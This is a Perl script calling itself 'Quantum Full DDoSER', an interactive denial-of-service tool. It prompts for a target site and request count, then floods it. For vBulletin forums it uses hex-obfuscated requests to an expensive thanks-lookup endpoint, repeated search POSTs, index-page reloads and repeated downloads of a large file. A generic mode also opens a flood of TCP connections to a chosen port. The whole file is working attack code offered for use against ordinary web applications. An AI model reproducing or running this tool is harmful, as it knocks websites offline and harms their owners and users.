#!/usr/bin/perl -w
#XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX#
#                            In the Name of God                            #
#                            Quantum Full DDoSER                           #
#                       saleh                   #
#                                                       #
#XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX#
print ("\033[93m[*] Fuck U");
system ("sleep 3");
system("clear");
system("sleep 2");
print ("\n\033[20;37m..........................\033[36m\n");
system("date");
print ("\n\033[20;37m..........................\033[36m\n");
system ("sleep 5");
use LWP::UserAgent;
use strict;
use LWP 5.64;
my $browser = LWP::UserAgent->new;
my $t = LWP::UserAgent->new() or die "DDoS Failed\n";
$t->agent('Mozilla/8.0 (compatible; MSIE 8.0; Windows NT 5.1)');
my $as="\x74\x68\x61\x6E\x6B\x73";
print("\x20\x20\x20\x20\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x20\x20\x20\x20\x20\n");
print("\x20\x20\x20\x20\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x49\x6E\x20\x74\x68\x65\x20\x4E\x61\x6D\x65\x20\x6F\x66\x20\x47\x6F\x64\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x20\x20\x20\x20\x20\x0D\x0A");
print("\x20\x20\x20\x20\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x51\x75\x61\x6E\x74\x75\x6D\x20\x46\x75\x6C\x6C\x20\x44\x44\x6F\x53\x45\x52\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x20\x20\x0D\x0A");
print("\x20\x20\x20\x20\x20\x58\x58\x58\x58\x20\x57\x72\x69\x74\x69\x6E\x67\x20\x42\x79\x20\x41\x6D\x69\x6E\x20\x53\x68\x6F\x6B\x6F\x68\x69\x20\x28\x50\x65\x6A\x76\x61\x6B\x29\x20\x58\x58\x58\x58\x58\x20\x20\x20\x0D\x0A");
print("\x20\x20\x20\x20\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x57\x77\x57\x2E\x51\x6E\x32\x2E\x4F\x72\x47\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x20\x20\x0D\x0A");
print("\x20\x20\x20\x20\x20\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x20\x20\x20\x20\x20\x20\n");
print("\nSelect Web Appliction Your Target \n");
print q(
If VBulletin Plz Insert 1
If Joomla Plz Insert 2
If Word Prees Plz Insert 3
If Php-Nuke Plz Insert 4
IF Other Plz Insert 5
);
print("\033[31m[~] \033[36mtype here number \033[35m=>\033[20;37m ");
my $app=(<stdin>);
chomp($app);
sub vbulletin(){
print("\033[31m[#] > \033[20;37mi can DDoS vnulletin in 5 method plz select a method => \033[35m");
print("\n\033[31m[#]\033[20;37m method 1 hook tnx ajax : insert \033[36m[1]");
print("\n\033[31m[#] \033[20;37mmethod 2 search box : insert 2");
print("\n\033[31m[#] \033[20;37mmethod 3 refresh index page : insert \033[35m[3]");
print("\n\033[31m[#] \033[20;37mmethod 4 download a file heavy in <server> target : insert \033[35m[4]");
print("\n\033[31m[#]\033[20;37m method \033[36m[5] \033[20;37muse <All> method : insert \033[36m[5]\n");
print("\033[31m[~] \033[36mtype here number =>\033[20;37m ");
my $me=(<stdin>);
chomp($me);
if($me == '1'){
print("insert Your target example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F) Or (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x6F\x72\x75\x6D\x2F)\n");
print("\033[31m[~] \033[36menter target =>\033[20;37m ");
my $address=(<stdin>);
chomp($address);
print("\n\033[31m[#]\033[20;37m insert requast number example \033[36m[800]\n");
print("\033[31m[~] \033[20;37mtype here => \033[36m");
my $nv=(<stdin>);
chomp($nv);
print("\n\033[31m[*]\033[36m ATTACK STARTED => $address | $nv | ..\n");
my $i=0;
for( ;$i<$nv;$i++){
$t->request(HTTP::Request->new(GET=>$address."post_".$as."\x2E\x70\x68\x70"."?"."\x64\x6F\x3D\x66\x69\x6E\x64\x61\x6C\x6C\x74\x68\x61\x6E\x6B"."s")) or die "DDoS Failed\n";
print("\033[20;37m[*] stats attack = $i\n");
}
print("                ............. Down .............");
}
if($me == '2'){
print("Insert Your Target Example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F) Or (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x6F\x72\x75\x6D\x2F)\n");
print("Target =");
my $address=(<stdin>);
chomp($address);
my $se="Pejvak";
my $ra=rand(3);
print("\n\033[20;37m[#] insert <requast> number example [800]\n");
print("[~] type here => ");
my $nv1=(<stdin>);
chomp($nv1);
print("[*] ATTACK START => $address\n");
my $i=0;
for( ;$i<$nv1;$i++){
$browser->post( $address."search.php",
[ "query" => $se.$ra]);
print("stats attack = $i\n");
}
print("                ............. Down .............");
}
if($me == '3'){
print("Insert Your Target Example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F) Or (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x6F\x72\x75\x6D\x2F)\n");
print("Target =");
my $address=(<stdin>);
chomp($address);
print("\n[#] insert requast number example [800]\n");
print("[~] type here => ");
my $nv3=(<stdin>);
chomp($nv3);
print("Atack Started ...\n");
my $i=0;
for( ;$i<$nv3;$i++){
$t->request(HTTP::Request->new(GET=>$address));
print("stats attack => $i\n");
}
print("                ............. Down .............");
}
if($me == '4'){
use LWP::Simple;
my $rann=rand(10);
print("\n[#] insert address a file in the traget <server> example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x69\x6C\x65\x2E\x72\x61\x72)\n");
print("[~] address => ");
my $addressfile=(<stdin>);
chomp($addressfile);
print("\n[#] insert requast number example [800]\n");
my $nv4=(<stdin>);
chomp($nv4);
print("[*] ATTACK START | $address ...\n");
my $i=0;
for( ;$i<$nv4;$i++){
getstore($addressfile,rand(10).".Qn2");
print("Stat Download File$i\n");
}
print("                ............. Down .............");
}
if($me == '5'){
print("Insert Your Target Example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F) Or (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x6F\x72\x75\x6D\x2F)\n");
print("[~] target => ");
my $address=(<stdin>);
chomp($address);
my $seee="S.L.";
my $raaa=rand(3);
print("\nInsert Address A File In The Traget Server Example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x69\x6C\x65\x2E\x72\x61\x72)\n");
print("Address = ");
my $addressfile=(<stdin>);
chomp($addressfile);
print("\n[#] insert requast number example [800]\n");
print("[~] type here number => ");
my $nv5=(<stdin>);
chomp($nv5);
print("[*] ATTACK SARTED $address...\n");
my $i=0;
for( ;$i<$nv5;$i++){
$browser->post( $address."search.php",
[ "query" => $seee.$raaa]);
$t->request(HTTP::Request->new(GET=>$address));
$t->request(HTTP::Request->new(GET=>$address."post_".$as."\x2E\x70\x68\x70"."?"."\x64\x6F\x3D\x66\x69\x6E\x64\x61\x6C\x6C\x74\x68\x61\x6E\x6B"."s")) or die "DDoS Failed\n";
getstore($addressfile,rand(10).".Qn2");
print("stats attack = $i\n");
}
print("                ............. Down .............");
}
}
sub joomla(){
print("\n[*] this program not is <FULL> version\n");
}
sub wordprees(){
print("\n[*] this program not is <FULL> version\n");
}
sub phpnuke(){
print("\n[*] this program not is <FUll> version\n");
}
sub other(){
print("\n[#] method [1] refresh indeX page : insert [1]");
print("\n[#] method [2] SYN: insert [2]");
print("\n[#] method [3] download a file heavy in <server> target : insert 3\n");
print("[~] type here number => ");
my $oth=(<stdin>);
chomp($oth);
if ($oth=='1'){
print("insert your target ");
print("[~] target => ");
my $tot=(<stdin>);
chomp($tot);
print("\n[#] insert rqquast number example [800]\n");
print("[~] type here number => ");
my $othn=(<stdin>);
chomp($othn);
my $i=0;
for( ;$i<$othn;$i++){
$t->request(HTTP::Request->new(GET=>$tot));
print("stats attack = $i\n");
}
print("                ............. Down .............");

}
if ($oth=='2'){
use IO::Socket; 
print("Insert Your Target Example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F) Or (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x6F\x72\x75\x6D\x2F)\n");
print("Target = ");
my $tot=(<stdin>);
chomp($tot);
print("\n[#] plz insert port example [80] or [3306]\n");
print("[~] type here port => ");
my $portt=(<stdin>);
chomp($portt);
print("\n[#] insert requast number example [800]\n");
print("[~] type here number => ");
my $othn=(<stdin>);
chomp($othn);
my $i=0;
for( ;$i<$othn;$i++){
my $syn = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$tot", PeerPort => "$portt");
print("stats attack = $i\n");
}
print("                ............. Down .............");

}
if ($oth=='3'){
my $rann=rand(10);
print("\nInsert Address A File In The Traget Server Example (\x68\x74\x74\x70\x3A\x2F\x2F\x71\x6E\x32\x2E\x6F\x72\x67\x2F\x66\x69\x6C\x65\x2E\x72\x61\x72)\n");
print("Address = ");
my $addressfile=(<stdin>);
chomp($addressfile);
print("\n[#] insert requast number example [800]\n");
print("[~] type here number => ");
my $nv4=(<stdin>);
chomp($nv4);
print("[*] ATTACK STARTED | $address ...\n");
my $i=0;
for( ;$i<$nv4;$i++){
getstore($addressfile,rand(10).".Qn2");
print("Stat Download File : $i\n");
}
print("                ............. Down .............");

}




}
if($app == '1'){
vbulletin();
}
if($app == '2'){
joomla();
}
if($app == '3'){
wordprees();
}
if($app== '4'){
phpnuke();
}
if($app== '5'){
other();
}
